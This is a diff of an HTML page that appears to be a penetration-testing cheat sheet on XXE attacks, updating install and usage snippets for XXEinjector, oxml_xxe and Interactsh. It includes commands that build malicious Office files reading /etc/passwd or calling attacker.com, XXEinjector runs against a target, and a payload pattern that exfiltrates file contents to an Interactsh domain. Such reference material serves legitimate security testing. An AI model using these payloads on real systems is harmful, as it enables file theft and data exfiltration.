@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=6681afa">
+  <link rel="stylesheet" href="/assets/style.css?v=20e6a58">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1803,7 +1803,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <tr>
 <td><strong>oxml_xxe</strong></td>
 <td>XXE in Office documents (DOCX, XLSX)</td>
-<td><code>python oxml_xxe.py generate -t xlsx</code></td>
+<td><code>ruby server.rb</code></td>
 </tr>
 <tr>
 <td><strong>Burp Suite Collaborator</strong></td>
@@ -1827,19 +1827,18 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 </tr>
 </tbody>
 </table>
-<h3 id="xxeinjector">XXEinjector</h3>
+<h3 id="xxeinjector"><a href="https://github.com/enjoiz/xxeinjector">XXEinjector</a></h3>
 <pre class="highlight"><code class="language-bash">git clone https://github.com/enjoiz/XXEinjector.git
 cd XXEinjector
 ./xxeinjector.py -u http://target.com/api/process -f file.xml
 ./xxeinjector.py -u http://target.com -t bing -p http://127.0.0.1:8080/admin</code></pre>
-<h3 id="oxml_xxe">oxml_xxe</h3>
-<pre class="highlight"><code class="language-bash">pip install oxml_xxe
-python -m oxml_xxe generate -t xlsx -p "file:///etc/passwd" -o malicious.xlsx
-python -m oxml_xxe generate -t docx -p "http://attacker.com/?data=test" -o malicious.docx</code></pre>
-<h3 id="interactsh">Interactsh</h3>
-<pre class="highlight"><code class="language-bash">wget https://github.com/projectdiscovery/interactsh/releases/download/v1.0.0/interactsh-client_1.0.0_linux_amd64.zip
-unzip interactsh-client_1.0.0_linux_amd64.zip
-./interactsh-client
+<h3 id="oxml_xxe"><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a></h3>
+<pre class="highlight"><code class="language-bash">apt-get install -y make git libsqlite3-dev libxslt-dev libxml2-dev zlib1g-dev gcc ruby3.2 g++
+gem install bundler
+bundle install
+ruby server.rb</code></pre>
+<h3 id="interactsh"><a href="https://github.com/projectdiscovery/interactsh">Interactsh</a></h3>
+<pre class="highlight"><code class="language-bash">go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
 # Use the generated domain in XXE payloads: http://&lt;YOUR_INTERACTSH_DOMAIN&gt;/?data=%file;</code></pre>
 <hr />
 <h1 id="references">References</h1>
@@ -1968,6 +1967,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=6681afa" defer></script>
+  <script src="/assets/main.js?v=20e6a58" defer></script>
 </body>
 </html>
